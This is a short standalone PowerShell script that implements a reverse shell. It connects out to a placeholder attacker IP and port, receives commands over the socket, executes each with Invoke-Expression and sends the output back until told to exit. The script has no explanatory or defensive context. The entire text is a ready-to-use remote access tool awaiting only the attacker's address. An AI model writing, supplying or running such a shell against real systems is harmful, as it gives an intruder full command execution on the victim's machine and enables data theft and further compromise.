$client = New-Object System.Net.Sockets.TCPClient("YOUR_ATTACKER_IP", YOUR_ATTACKER_PORT)
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)

while ($true) {
    $command = $reader.ReadLine()
    if ($command -eq "exit") { break }
    $output = Invoke-Expression $command 2>&1
    $writer.WriteLine($output)
    $writer.Flush()
}

$client.Close()
